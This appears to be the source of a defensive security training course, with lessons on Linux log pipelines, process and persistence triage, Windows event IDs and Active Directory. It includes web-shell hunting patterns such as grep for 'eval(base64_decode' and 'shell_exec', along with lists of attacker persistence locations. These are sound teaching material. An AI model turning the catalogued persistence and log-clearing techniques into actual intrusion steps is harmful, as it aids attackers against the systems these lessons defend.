<div class="callout real"><b>On the job:</b> sudo usage is logged to <code>/var/log/auth.log</code> or <code>/var/log/secure</code> and the journal, e.g. <code>sudo: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/bash</code>. A web-service account running sudo, or anyone running an interactive root shell at 3 a.m., is worth a closer look.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 (220-1102) objective 1.9 (chmod, chown, sudo/su). Security+ SY0-701 objective 4.5 (hardening, file permissions, least privilege) and 4.6 (identity and access management, privileged access).</div>`,
  keyTerms: [
    ["chmod", "Changes file permissions using octal (755) or symbolic (u+x) notation"],
    ["chown", "Changes file owner and group"],
    ["umask", "Mask of permissions removed from newly created files"],
    ["SUID", "Bit that makes a program run with its owner's privileges"],
    ["SGID", "Bit that makes a program run with its group, or directories pass on their group"],
    ["Sticky bit", "On shared directories, only file owners can delete their files"],
    ["sudo", "Runs commands with elevated privileges per /etc/sudoers rules, with logging"],
    ["visudo", "Safe editor for sudoers that validates syntax"],
    ["Least privilege", "Grant only the minimum access needed to do the job"]
  ],
  standards: ["CIS Benchmarks for Linux", "MITRE ATT&CK T1548.001"],
  labs: ["lab-linux-terminal"]
},
{
  id: "p0-m3-l3",
  module: "p0-m3",
  title: "Text Processing for Log Analysis: grep, awk, sed, sort, uniq and find",
  minutes: 22,
  objectives: [
    "Search logs with grep including regular expressions and context",
    "Extract and count fields with cut, awk, sort and uniq",
    "Build one-line pipelines that answer investigation questions",
    "Locate recently changed or suspicious files with find"
  ],
  html: `<p>An SIEM is wonderful, but sooner or later you will be on a box with just a shell and a 2 GB log. Analysts who can turn a question into a pipeline — "which IPs failed SSH logins most?" — in 30 seconds are enormously valuable. This lesson teaches the small set of tools that do 90% of that work.</p>

<h3>Our sample data</h3>
<p>Lines from <code>/var/log/auth.log</code> on Ubuntu (newer releases may print ISO-8601 timestamps such as <code>2026-10-20T03:14:07.512+00:00</code> instead):</p>
<pre><code>Oct 20 03:14:07 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.45 port 52114 ssh2
Oct 20 03:14:09 web01 sshd[2211]: Failed password for root from 203.0.113.45 port 52116 ssh2
Oct 20 03:20:41 web01 sshd[2290]: Accepted publickey for deploy from 198.51.100.7 port 40022 ssh2
Oct 20 03:31:02 web01 sshd[2301]: Failed password for root from 192.0.2.99 port 61001 ssh2</code></pre>

<h3>grep: find lines</h3>
<pre><code>$ grep "Failed password" auth.log           # lines containing the text
$ grep -i "failed" auth.log                 # case-insensitive
$ grep -v "CRON" syslog                     # invert: lines NOT matching
$ grep -c "Accepted" auth.log               # count matches
$ grep -C 3 "session opened for user root" auth.log   # 3 lines of context
$ grep -rl "eval(base64_decode" /var/www/   # recursive, list files (web shell hunt)
$ zgrep "Failed" /var/log/auth.log.2.gz     # search rotated, compressed logs</code></pre>
<p>Add <code>-E</code> for extended regular expressions and <code>-o</code> to print only the matched part:</p>
<pre><code># Extract every IPv4 address
$ grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' auth.log
# Extract the "from IP" in failed logins
$ grep "Failed password" auth.log | grep -oE 'from [0-9.]+' </code></pre>
<table>
<tr><th>Regex</th><th>Meaning</th></tr>
<tr><td><code>^</code> / <code>$</code></td><td>Start / end of line</td></tr>
<tr><td><code>.</code></td><td>Any single character (escape as <code>\\.</code> for a literal dot)</td></tr>
<tr><td><code>*</code>, <code>+</code>, <code>?</code></td><td>0 or more, 1 or more, 0 or 1 of the previous item</td></tr>
<tr><td><code>[0-9]</code>, <code>[a-f]</code></td><td>Character class</td></tr>
<tr><td><code>{1,3}</code></td><td>Between 1 and 3 repetitions</td></tr>
<tr><td><code>(a|b)</code></td><td>Alternation: a or b</td></tr>
</table>

<h3>cut and awk: pull out fields</h3>
<p><code>cut</code> splits on a single delimiter; <code>awk</code> splits on whitespace by default and is a small programming language. <code>$1</code> is the first field, <code>$NF</code> the last, <code>NF</code> the number of fields.</p>
<pre><code>$ cut -d: -f1,7 /etc/passwd                      # usernames and shells
$ awk '{print $1, $2, $3}' auth.log              # date and time columns
$ awk -F: '$3 &gt;= 1000 {print $1}' /etc/passwd    # human (non-system) accounts
# Apache/Nginx combined log: field 1 = client IP, field 9 = status code
$ awk '$9 == 404 {print $1}' access.log
$ awk '{bytes[$1] += $10} END {for (ip in bytes) print bytes[ip], ip}' access.log | sort -rn | head</code></pre>

<h3>sort and uniq: count things</h3>
<p><code>uniq</code> only collapses <i>adjacent</i> duplicates, so always <code>sort</code> first. <code>uniq -c</code> prefixes counts; <code>sort -rn</code> sorts numerically, largest first. This trio is the analyst's "stack count".</p>
<pre><code># Top source IPs for failed SSH passwords
$ grep "Failed password" auth.log | grep -oE 'from [0-9.]+' | awk '{print $2}' \\
    | sort | uniq -c | sort -rn | head
     812 203.0.113.45
      37 192.0.2.99

# Which usernames are being guessed?
$ grep -oE 'Failed password for (invalid user )?[^ ]+' auth.log | awk '{print $NF}' \\
    | sort | uniq -c | sort -rn | head

# Did the noisy IP ever succeed? (the question that matters)
$ grep "Accepted" auth.log | grep 203.0.113.45</code></pre>
<div class="callout real"><b>On the job:</b> hundreds of failures from one IP is routine internet noise. A brute force followed by an <code>Accepted</code> from the same IP is an incident. Many failures from <i>many</i> IPs against <i>many</i> usernames, each tried once or twice, is password spraying. Counting and correlating is how you tell them apart.</div>

<h3>sed: edit streams</h3>
<pre><code>$ sed -n '100,120p' big.log                  # print only lines 100-120
$ sed 's/203\\.0\\.113\\.45/[REDACTED]/g' auth.log &gt; shareable.log   # redact before sharing
$ sed '/CRON/d' syslog                       # delete matching lines from output</code></pre>

<h3>find: locate files by attributes</h3>
<pre><code>$ find /var/www -name "*.php" -mtime -2           # PHP files modified in last 2 days
$ find /tmp /dev/shm -type f -perm -u+x           # executables in temp dirs
$ find / -type f -mmin -30 -not -path "/proc/*" 2&gt;/dev/null   # changed in last 30 min
$ find /home -name authorized_keys -newer /etc/hostname
$ find / -nouser -o -nogroup 2&gt;/dev/null          # files with no valid owner
$ find /var/www -type f -name "*.php" -exec grep -l "shell_exec" {} +</code></pre>
<div class="callout tip">Build pipelines one stage at a time: run the first command, check the output, then add <code>| next</code>. When something breaks, you will know exactly which stage did it. Add <code>| head</code> while experimenting so you don't flood your terminal.</div>
<div class="callout warn">Timestamps in logs may be local time or UTC depending on configuration. Before correlating across systems, confirm the time zone and that the hosts sync with NTP.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.9 "Given a scenario, use data sources to support an investigation" (log data, automated reports). CySA+ (Phase 2) tests these exact grep/awk pipelines in performance-based questions. A+ Core 2 objective 1.9 lists grep and find.</div>`,
  keyTerms: [
    ["grep", "Searches text for lines matching a pattern or regular expression"],
    ["Regular expression", "Pattern language for matching text (e.g. [0-9]{1,3})"],
    ["awk", "Field-oriented text processing language; $1 is the first field"],
    ["cut", "Extracts columns using a single delimiter"],
    ["uniq -c", "Counts adjacent duplicate lines; sort first"],
    ["sed", "Stream editor for substitutions, deletions and line selection"],
    ["find", "Locates files by name, time, size, permissions or owner"],
    ["Stack counting", "Counting occurrences to find outliers (sort | uniq -c | sort -rn)"],
    ["Password spraying", "Trying a few common passwords against many accounts"]
  ],
  standards: ["MITRE ATT&CK T1110"],
  labs: ["lab-linux-terminal"]
},
{
  id: "p0-m3-l4",
  module: "p0-m3",
  title: "Processes, Services, Networking and Logs: ps, ss, systemctl and journalctl",
  minutes: 20,
  objectives: [
    "Inspect running processes with ps, top and /proc",
    "Manage services with systemctl and find persistence in systemd and cron",
    "Map network connections to processes with ss and lsof",
    "Query the systemd journal with journalctl filters"
  ],
  html: `<p>Logs tell you what happened; the live system tells you what is happening now. In this lesson you learn to answer the triage questions every responder asks on a Linux host: <i>What is running? What is it talking to? What starts automatically? What do the logs say?</i></p>

<h3>Processes</h3>
<pre><code>$ ps aux                        # every process: USER PID %CPU %MEM ... COMMAND
$ ps -ef --forest               # full format with parent/child tree
$ ps -eo pid,ppid,user,lstart,cmd --sort=lstart | tail   # newest processes
$ pgrep -a python               # find processes by name, show command lines
$ top                           # live view (htop if installed); press q to quit</code></pre>
<p>Red flags when reading a process list:</p>
<ul>
<li>Processes running from <code>/tmp</code>, <code>/dev/shm</code> or a hidden directory like <code>/var/tmp/.x/</code></li>
<li>A web server user (<code>www-data</code>, <code>apache</code>, <code>nginx</code>) parenting <code>sh</code>, <code>bash</code>, <code>nc</code>, <code>curl</code> or <code>python</code> — classic web-shell behavior</li>
<li>Names that imitate kernel threads, e.g. <code>[kworker/0:1]</code> owned by a normal user</li>
<li>Sustained 100% CPU from an unknown process — cryptominers</li>
</ul>
<p>The <code>/proc</code> file system lets you look behind a process's claimed name:</p>
<pre><code>$ ls -l /proc/4242/exe          # the real binary (shows "(deleted)" if removed from disk)
$ tr '\\0' ' ' &lt; /proc/4242/cmdline; echo
$ ls -l /proc/4242/cwd          # its working directory
$ sudo cat /proc/4242/environ | tr '\\0' '\\n'</code></pre>
<div class="callout warn">Do not <code>kill</code> a suspicious process the moment you find it. Killing it destroys in-memory evidence and tips off the attacker. Follow your incident response plan: document, consider memory capture, contain (e.g. isolate the host) and then eradicate.</div>

<h3>Services with systemd</h3>
<p>Modern distributions use <b>systemd</b> (PID 1) to manage services ("units").</p>
<pre><code>$ systemctl status ssh                 # state, PID and recent log lines
$ systemctl list-units --type=service --state=running
$ systemctl list-unit-files --state=enabled     # what starts at boot
$ sudo systemctl stop|start|restart|enable|disable nginx
$ systemctl list-timers                # systemd's cron replacement
$ systemctl cat suspicious.service     # show the unit file contents</code></pre>
<p>Attackers persist by adding units under <code>/etc/systemd/system/</code> or <code>~/.config/systemd/user/</code> (ATT&amp;CK T1543.002), by cron jobs (T1053.003) in <code>/etc/crontab</code>, <code>/etc/cron.d/</code> and <code>crontab -l</code> for each user, by SSH keys in <code>authorized_keys</code> (T1098.004), and by editing shell startup files like <code>~/.bashrc</code>.</p>
<pre><code>$ ls -lt /etc/systemd/system/ | head        # recently modified units first
$ for u in $(cut -d: -f1 /etc/passwd); do sudo crontab -l -u $u 2&gt;/dev/null | sed "s/^/$u: /"; done</code></pre>

<h3>Network connections</h3>
<p><code>ss</code> (socket statistics) replaces the older <code>netstat</code>.</p>
<pre><code>$ sudo ss -tulpn                 # listening TCP/UDP with process names
$ sudo ss -tnp state established # live TCP connections with processes
$ sudo lsof -i -P -n             # open network files per process
$ sudo lsof -p 4242              # everything process 4242 has open
$ ip -br addr; ip route          # interfaces and routes</code></pre>
<p>Ask of each connection: is this process expected to talk to the network, is the remote address expected (internal? a known SaaS? a VPS provider in an unexpected country?), and is the port sensible for the program?</p>

<h3>Logs: the journal and /var/log</h3>
<p>systemd's <b>journal</b> stores structured logs from the kernel and all services. Classic text logs in <code>/var/log</code> are written by rsyslog where it is installed.</p>
<table>
<tr><th>Command</th><th>Shows</th></tr>
<tr><td><code>journalctl -u ssh --since "1 hour ago"</code></td><td>SSH daemon logs from the last hour (unit is <code>sshd</code> on RHEL)</td></tr>
<tr><td><code>journalctl -p err -b</code></td><td>Errors and worse since last boot</td></tr>
<tr><td><code>journalctl -f</code></td><td>Follow live, like <code>tail -f</code></td></tr>
<tr><td><code>journalctl _UID=33 --since today</code></td><td>Entries from UID 33 (www-data)</td></tr>
<tr><td><code>journalctl --since "2026-10-20 03:00" --until "2026-10-20 04:00"</code></td><td>A precise incident window</td></tr>
<tr><td><code>journalctl -k</code></td><td>Kernel messages (like <code>dmesg</code>)</td></tr>
<tr><td><code>journalctl -o json-pretty -n 5</code></td><td>Structured fields, great for scripting</td></tr>
<tr><td><code>journalctl --list-boots</code></td><td>Previous boots (unexpected reboots?)</td></tr>
</table>
<p>Other high-value sources: <code>last</code> / <code>lastb</code> (successful/failed logins from wtmp/btmp), <code>/var/log/audit/audit.log</code> if <b>auditd</b> is configured (search with <code>ausearch</code>), web server logs under <code>/var/log/nginx/</code> or <code>/var/log/apache2/</code>, and package logs (<code>/var/log/dpkg.log</code>, <code>dnf history</code>) that reveal installed tools.</p>
<div class="callout real"><b>On the job — a five-command triage:</b>
<pre><code>$ uptime; w                           # load, uptime, who is on
$ sudo ss -tnp state established      # what is talking out
$ ps -ef --forest | less              # process tree
$ systemctl list-unit-files --state=enabled; ls -la /etc/cron.d
$ sudo journalctl -u ssh --since "-24h" | grep -E "Accepted|Failed" | tail -50</code></pre>
Capture the outputs to your case notes with timestamps — your report depends on them.</div>
<div class="callout tip">If logs are suspiciously empty or the journal has a gap, that is itself evidence. Attackers clear logs (ATT&amp;CK T1070.002). This is exactly why organizations forward logs off the host to a SIEM in near real time.</div>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 objective 1.9 (ps, top, ip, systemctl). Security+ SY0-701 objective 4.9 (log data, OS-specific security logs) and 2.4 (indicators such as missing logs and resource consumption). Linux+ and CySA+ go deeper.</div>`,
  keyTerms: [
    ["ps", "Lists processes; ps -ef --forest shows the parent/child tree"],
    ["/proc", "Virtual file system exposing live process and kernel information"],
    ["systemd", "Init system (PID 1) that manages services, timers and logging"],
    ["systemctl", "Command to control and inspect systemd units"],
    ["journalctl", "Queries the systemd journal with time, unit, priority and field filters"],
    ["ss", "Shows sockets: listening ports and connections with owning processes"],
    ["lsof", "Lists open files, including network sockets, per process"],
    ["cron", "Scheduler for recurring jobs; common persistence location"],
    ["auditd", "Linux audit daemon recording detailed security events"]
  ],
  standards: ["MITRE ATT&CK T1543.002", "MITRE ATT&CK T1053.003", "MITRE ATT&CK T1070.002"],
  labs: ["lab-linux-terminal"]
}
);

// ===================== p0-m4 Windows & Active Directory =====================
CP.lessons.push(
{
  id: "p0-m4-l1",
  module: "p0-m4",
  title: "Windows Internals for Defenders: Processes, Services, Registry and Accounts",
  minutes: 20,
  objectives: [
    "Recognize the normal Windows core processes and their expected parents",
    "Navigate the registry and name common persistence keys",
    "Explain local accounts, SIDs, access tokens and UAC",
    "Read NTFS permissions with icacls"
  ],
  html: `<p>Windows runs most corporate desktops and the identity backbone (Active Directory) of most enterprises, so it is where most intrusions play out. Spotting "evil" on Windows starts with knowing what "normal" looks like.</p>

<h3>Know normal: the core processes</h3>
<table>
<tr><th>Process</th><th>Expected parent</th><th>Notes</th></tr>
<tr><td>System (PID 4)</td><td>none</td><td>Kernel threads</td></tr>
<tr><td>smss.exe</td><td>System</td><td>Session Manager; one master instance</td></tr>
<tr><td>csrss.exe</td><td>smss.exe (which exits)</td><td>One per session; runs from <code>C:\\Windows\\System32</code></td></tr>
<tr><td>wininit.exe</td><td>smss.exe (exits)</td><td>Session 0 only; starts services.exe and lsass.exe</td></tr>
<tr><td>services.exe</td><td>wininit.exe</td><td>Service Control Manager — only one instance</td></tr>
<tr><td>svchost.exe</td><td>services.exe</td><td>Hosts services; always started with <code>-k</code> group argument</td></tr>
<tr><td>lsass.exe</td><td>wininit.exe</td><td>Local Security Authority — authentication, credential material. Exactly one.</td></tr>
<tr><td>winlogon.exe</td><td>smss.exe (exits)</td><td>Handles interactive logon; launches userinit.exe</td></tr>
<tr><td>explorer.exe</td><td>userinit.exe (exits)</td><td>The user's desktop shell; one per logged-on user</td></tr>
</table>
<p>Evil often hides by imitation: <code>svchost.exe</code> running from <code>C:\\Users\\Public\\</code>, <code>lsass.exe</code> with a parent other than wininit, a second lsass, or misspellings like <code>scvhost.exe</code> or <code>lsas.exe</code>. Tools: Task Manager (Details tab), Sysinternals <b>Process Explorer</b> (shows trees, signatures and VirusTotal lookups) and PowerShell.</p>
<pre><code>PS&gt; Get-CimInstance Win32_Process |
      Select-Object ProcessId,ParentProcessId,Name,ExecutablePath,CommandLine</code></pre>

<h3>Services</h3>
<p>Services start without a user logged on, often as <b>LocalSystem</b> (more powerful than an admin). Installing a new service is a classic persistence and lateral-movement technique (PsExec creates one). New services are logged as <b>Event ID 7045</b> in the System log.</p>
<pre><code>C:\\&gt; sc query state= all
C:\\&gt; sc qc SuspiciousSvc          # shows BINARY_PATH_NAME and start type
PS&gt; Get-Service | Where-Object Status -eq Running</code></pre>

<h3>The registry</h3>
<p>The registry is Windows' hierarchical configuration database. The root keys (hives) you will use:</p>
<ul>
<li><b>HKLM</b> (HKEY_LOCAL_MACHINE) — machine-wide settings; files in <code>C:\\Windows\\System32\\config\\</code> (SYSTEM, SOFTWARE, SAM, SECURITY)</li>
<li><b>HKCU</b> (HKEY_CURRENT_USER) — the logged-on user's settings; file <code>NTUSER.DAT</code> in their profile</li>
<li>HKU, HKCR, HKCC — all users, file associations/COM classes, current hardware profile</li>
</ul>
<p>Common persistence locations (ATT&amp;CK T1547.001):</p>
<pre><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
HKLM\\SYSTEM\\CurrentControlSet\\Services\\        (every service)
HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon  (Userinit, Shell values)

C:\\&gt; reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
PS&gt; Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'</code></pre>
<div class="callout tip">Sysinternals <b>Autoruns</b> shows every auto-start location (Run keys, services, scheduled tasks, WMI subscriptions, drivers) in one place and can hide Microsoft-signed entries so the unusual stands out. Scheduled tasks (Event ID 4698) are as common for persistence as Run keys.</div>

<h3>Accounts, SIDs, tokens and UAC</h3>
<p>Every user, group and computer has a <b>Security Identifier (SID)</b> like <code>S-1-5-21-3623811015-3361044348-30300820-1013</code>. The final number is the <b>RID</b>: 500 is the built-in Administrator, 501 Guest, 512 Domain Admins, and new users start at 1000+. Well-known SIDs include <code>S-1-5-18</code> (LocalSystem) and <code>S-1-5-32-544</code> (local Administrators group).</p>
<p>At logon, LSASS builds an <b>access token</b> listing the user's SID, group SIDs and privileges (e.g. <code>SeDebugPrivilege</code>, <code>SeImpersonatePrivilege</code>). Every process carries a token, and Windows checks it against an object's ACL on access. <b>UAC</b> (User Account Control) gives administrators a filtered, standard-user token until they approve elevation, so malware cannot silently use admin rights. Attackers try "UAC bypass" techniques (T1548.002); setting UAC to "Always notify" and not giving users local admin rights are strong mitigations.</p>
<pre><code>C:\\&gt; whoami /all              # your SID, groups and privileges
C:\\&gt; net localgroup administrators
C:\\&gt; net user jdoe</code></pre>
<div class="callout real"><b>On the job:</b> <b>LAPS</b> (Windows LAPS, built into Windows since 2023) gives every machine a unique, rotated local Administrator password stored in AD or Entra ID. Without it, one stolen local admin hash often works on every workstation — perfect for lateral movement.</div>

<h3>NTFS permissions</h3>
<p>NTFS uses <b>ACLs</b> made of Access Control Entries: Full control (F), Modify (M), Read &amp; execute (RX), Read (R), Write (W). Permissions inherit from parent folders unless inheritance is broken; an explicit <b>Deny</b> beats Allow. Share permissions (for network access) combine with NTFS permissions — the most restrictive wins.</p>
<pre><code>C:\\&gt; icacls C:\\Finance
C:\\Finance BUILTIN\\Administrators:(OI)(CI)(F)
           CORP\\Finance-RW:(OI)(CI)(M)
           Everyone:(OI)(CI)(RX)        &lt;-- probably a finding
# (OI) object inherit, (CI) container inherit</code></pre>
<div class="callout exam"><b>Exam mapping:</b> A+ Core 2 (220-1102) Domain 1.0 covers Windows editions, tools (Task Manager, regedit, services.msc, Event Viewer), command-line tools, UAC and NTFS vs share permissions; Domain 2.0 covers Windows security settings. Security+ SY0-701 objective 4.5 covers OS hardening.</div>`,
  keyTerms: [
    ["lsass.exe", "Local Security Authority process handling authentication and credential material"],
    ["svchost.exe", "Generic host process for services, child of services.exe"],
    ["Registry hive", "Top-level registry section backed by a file, e.g. HKLM\\SYSTEM"],
    ["Run key", "Registry location that launches programs at logon; common persistence"],
    ["SID", "Security Identifier uniquely identifying a user, group or computer"],
    ["RID", "Relative ID at the end of a SID; 500 = built-in Administrator"],
    ["Access token", "Object describing a process's user, groups and privileges"],
    ["UAC", "User Account Control: prompts before granting a full admin token"],
    ["ACL", "Access Control List of allow/deny entries on an object"],
    ["LAPS", "Local Administrator Password Solution: unique rotated local admin passwords"]
  ],
  standards: ["MITRE ATT&CK T1547.001", "MITRE ATT&CK T1543.003", "CIS Microsoft Windows Benchmarks"]
},
{
  id: "p0-m4-l2",
  module: "p0-m4",
  title: "Windows Event Logs and Event Viewer",
  minutes: 22,
  objectives: [
    "Navigate Event Viewer and the main Windows logs",
    "Recall the key Security Event IDs analysts use daily",
    "Interpret logon types and failure status codes",
    "Explain why Sysmon and PowerShell logging matter and how to enable them"
  ],
  html: `<p>Windows event logs are the single most important data source for a SOC analyst defending a Microsoft environment. Every SIEM detection for brute force, privilege escalation, lateral movement or log tampering on Windows is built on a small set of Event IDs. Learn these and you can read the story of an intrusion.</p>

<h3>The logs</h3>
<p>Open Event Viewer with <code>eventvwr.msc</code>. Logs are stored as <code>.evtx</code> files in <code>C:\\Windows\\System32\\winevt\\Logs\\</code>.</p>
<ul>
<li><b>Security</b> — authentication, account changes, privilege use, process creation (if audited). Only LSASS writes here.</li>
<li><b>System</b> — services, drivers, shutdowns (7045 new service, 7036 service state change).</li>
<li><b>Application</b> — application errors and messages.</li>
<li><b>Applications and Services Logs</b> — per-product logs: <code>Microsoft-Windows-PowerShell/Operational</code>, <code>Microsoft-Windows-Sysmon/Operational</code>, <code>Microsoft-Windows-TaskScheduler/Operational</code>, <code>Microsoft-Windows-Windows Defender/Operational</code>, <code>Microsoft-Windows-TerminalServices-*</code> (RDP).</li>
</ul>

<h3>The Event IDs to memorize</h3>
<table>
<tr><th>ID</th><th>Log</th><th>Meaning</th><th>Why you care</th></tr>
<tr><td>4624</td><td>Security</td><td>Successful logon</td><td>Who logged on, where from, how (logon type)</td></tr>
<tr><td>4625</td><td>Security</td><td>Failed logon</td><td>Brute force, spraying, typos</td></tr>
<tr><td>4634 / 4647</td><td>Security</td><td>Logoff / user-initiated logoff</td><td>Session duration</td></tr>
<tr><td>4648</td><td>Security</td><td>Logon with explicit credentials</td><td>runas, lateral movement</td></tr>
<tr><td>4672</td><td>Security</td><td>Special privileges assigned to new logon</td><td>Admin-equivalent logon</td></tr>
<tr><td>4688</td><td>Security</td><td>New process created</td><td>Process execution (enable command-line logging!)</td></tr>
<tr><td>4698</td><td>Security</td><td>Scheduled task created</td><td>Persistence</td></tr>
<tr><td>4720 / 4722 / 4726</td><td>Security</td><td>User created / enabled / deleted</td><td>Backdoor accounts</td></tr>
<tr><td>4724</td><td>Security</td><td>Attempt to reset a password</td><td>Account takeover</td></tr>
<tr><td>4728 / 4732 / 4756</td><td>Security</td><td>Member added to global / local / universal security group</td><td>Privilege escalation (e.g. into Domain Admins)</td></tr>
<tr><td>4740</td><td>Security</td><td>Account locked out</td><td>Brute force</td></tr>
<tr><td>4768 / 4769 / 4771</td><td>Security (DC)</td><td>Kerberos TGT requested / service ticket requested / pre-auth failed</td><td>Kerberoasting, AS-REP roasting, spraying</td></tr>
<tr><td>4776</td><td>Security (DC)</td><td>NTLM credential validation</td><td>NTLM usage and failures</td></tr>
<tr><td>1102</td><td>Security</td><td>Audit log cleared</td><td>Anti-forensics — almost always investigate</td></tr>
<tr><td>7045</td><td>System</td><td>New service installed</td><td>PsExec, malware persistence</td></tr>
<tr><td>4104</td><td>PowerShell/Operational</td><td>Script block logged</td><td>De-obfuscated PowerShell code</td></tr>
</table>

<h3>Logon types (in 4624/4625)</h3>
<table>
<tr><th>Type</th><th>Meaning</th></tr>
<tr><td>2</td><td>Interactive (at the keyboard)</td></tr>
<tr><td>3</td><td>Network (SMB share, many remote tools)</td></tr>
<tr><td>4 / 5</td><td>Batch (scheduled task) / Service</td></tr>
<tr><td>7</td><td>Unlock</td></tr>
<tr><td>8</td><td>NetworkCleartext (e.g. IIS basic auth) — password sent in clear</td></tr>
<tr><td>9</td><td>NewCredentials (runas /netonly)</td></tr>
<tr><td>10</td><td>RemoteInteractive (RDP)</td></tr>
<tr><td>11</td><td>CachedInteractive (domain logon with cached credentials, DC unreachable)</td></tr>
</table>
<p>Failure codes in 4625 (Status/SubStatus) tell you <i>why</i> it failed: <code>0xC0000064</code> user does not exist, <code>0xC000006A</code> wrong password, <code>0xC0000234</code> account locked, <code>0xC0000072</code> account disabled, <code>0xC0000071</code> password expired. Many 0xC0000064 failures means someone is guessing usernames; many 0xC000006A against one valid user means password guessing.</p>
<div class="callout real"><b>On the job:</b> a 4624 Logon Type 10 from an external IP to a server at 02:00, followed by 4672 (admin privileges), 4720 (new user created) and 4732 (user added to Administrators), then 1102 (log cleared), is a ransomware precursor pattern. Each event alone may be benign; the sequence is not.</div>

<h3>Querying events</h3>
<pre><code>PS&gt; Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24)} |
      Select-Object TimeCreated, Id, Message -First 20

C:\\&gt; wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text /c:5</code></pre>
<p>In Event Viewer, use <b>Filter Current Log</b> to enter IDs like <code>4624,4625,4740</code>, or a custom XPath view. You will build PowerShell triage scripts in p0-m5.</p>

<h3>Turning on the logs that matter</h3>
<p>Windows does not log everything by default. Recommended settings (via Group Policy, see next lesson):</p>
<ul>
<li><b>Advanced Audit Policy</b> — enable Logon/Logoff, Account Logon (Kerberos, credential validation), Account Management, Process Creation, and Security Group Management success and failure as appropriate. Check with <code>auditpol /get /category:*</code>.</li>
<li><b>Include command line in process creation events</b> — so 4688 records the full command line.</li>
<li><b>PowerShell Script Block Logging</b> (4104) and Module Logging.</li>
<li><b>Increase log sizes</b> — the default 20 MB Security log may hold only hours on a busy DC.</li>
<li><b>Sysmon</b> (Sysinternals System Monitor) — a free driver/service that logs rich events: 1 process creation with hashes and parent, 3 network connection, 7 image loaded, 8 CreateRemoteThread, 10 process access (e.g. to lsass), 11 file create, 13 registry value set, 22 DNS query. Deploy it with a community configuration such as SwiftOnSecurity's or Olaf Hartong's sysmon-modular.</li>
</ul>
<div class="callout warn">An attacker with admin rights can clear logs (1102 for Security, 104 for System) or stop the EventLog service. Forwarding events off-host in near real time (Windows Event Forwarding, an agent such as the Splunk Universal Forwarder, Elastic Agent, Wazuh or Microsoft's Azure Monitor Agent) is the defense: the evidence is already in the SIEM.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.9 "use data sources to support an investigation" (OS-specific security logs, endpoint logs) and 4.4 (security alerting and monitoring). A+ Core 2 objective 1.3/3.x includes Event Viewer for troubleshooting. CySA+ and SC-200 assume you know these IDs cold.</div>`,
  keyTerms: [
    ["Event ID 4624", "Successful logon; includes logon type and source address"],
    ["Event ID 4625", "Failed logon; Status/SubStatus codes explain why"],
    ["Event ID 4688", "Process creation (with command line if enabled)"],
    ["Event ID 1102", "Security audit log was cleared"],
    ["Event ID 7045", "A new service was installed (System log)"],
    ["Event ID 4104", "PowerShell script block logging"],
    ["Logon type", "How a logon occurred: 2 interactive, 3 network, 10 RDP, etc."],
    ["Sysmon", "Sysinternals tool that logs detailed process, network, file and registry events"],
    ["Advanced Audit Policy", "Granular Windows audit settings controlling what is logged"]
  ],
  standards: ["NIST SP 800-92", "MITRE ATT&CK T1070.001"],
  labs: ["lab-windows-events", "lab-powershell-triage"]
},
{
  id: "p0-m4-l3",
  module: "p0-m4",
  title: "Active Directory and Group Policy",
  minutes: 20,
  objectives: [
    "Describe domains, forests, trusts, OUs and domain controllers",
    "Explain users, groups, computer objects and the privileged groups",
    "Describe Group Policy processing order (LSDOU) and how to troubleshoot it",
    "Relate AD to Microsoft Entra ID in hybrid environments"
  ],
  html: `<p>Active Directory Domain Services (AD DS) is the identity and policy system behind most organizations' Windows networks. It authenticates users, tells computers who may log on, and pushes security settings to every machine. That is why attackers' first goal after landing on a workstation is often "get Domain Admin": owning AD means owning everything joined to it.</p>

<h3>The building blocks</h3>
<table>
<tr><th>Term</th><th>Meaning</th></tr>
<tr><td>Domain</td><td>An administrative and security boundary with a DNS name, e.g. <code>corp.example.com</code>; holds users, groups and computers</td></tr>
<tr><td>Domain Controller (DC)</td><td>Server running AD DS that stores the directory database (<code>NTDS.dit</code>) and answers authentication (Kerberos, NTLM) and LDAP queries</td></tr>
<tr><td>Forest</td><td>One or more domains sharing a schema and global catalog — the true security boundary</td></tr>
<tr><td>Trust</td><td>Relationship letting users from one domain/forest access resources in another</td></tr>
<tr><td>Organizational Unit (OU)</td><td>Container for organizing objects and delegating admin rights and linking GPOs</td></tr>
<tr><td>Object</td><td>A user, group, computer, service account or other entry, with attributes</td></tr>
<tr><td>SYSVOL</td><td>Shared folder on DCs replicating Group Policy files and logon scripts</td></tr>
</table>
<p>AD relies on <b>DNS</b> (clients find DCs via SRV records), <b>Kerberos</b> (TCP/UDP 88), <b>LDAP</b> (389/636), SMB (445) and RPC (135 plus dynamic ports). If DNS breaks, AD breaks.</p>

<h3>Groups and the crown jewels</h3>
<p>Assign permissions to <b>groups</b>, never to individual users — this is role-based access control in practice. AD group scopes are Domain Local, Global and Universal. The privileged groups you must monitor:</p>
<ul>
<li><b>Domain Admins</b>, <b>Enterprise Admins</b>, <b>Schema Admins</b>, <b>Administrators</b> (on DCs)</li>
<li><b>Account Operators, Backup Operators, Server Operators, Print Operators</b> — less obvious but can lead to domain compromise</li>
<li><b>DnsAdmins</b>, and accounts with replication rights (needed for DCSync attacks)</li>
<li>The <b>krbtgt</b> account, whose key signs every Kerberos ticket</li>
</ul>
<p>Microsoft's <b>tiered administration</b> / Enterprise Access Model says Domain Admin credentials should only ever be used on DCs and privileged access workstations — never typed into a regular laptop where malware could steal them. The <b>Protected Users</b> group adds hardening (no NTLM, no cached credentials, no RC4/DES Kerberos) for privileged accounts.</p>
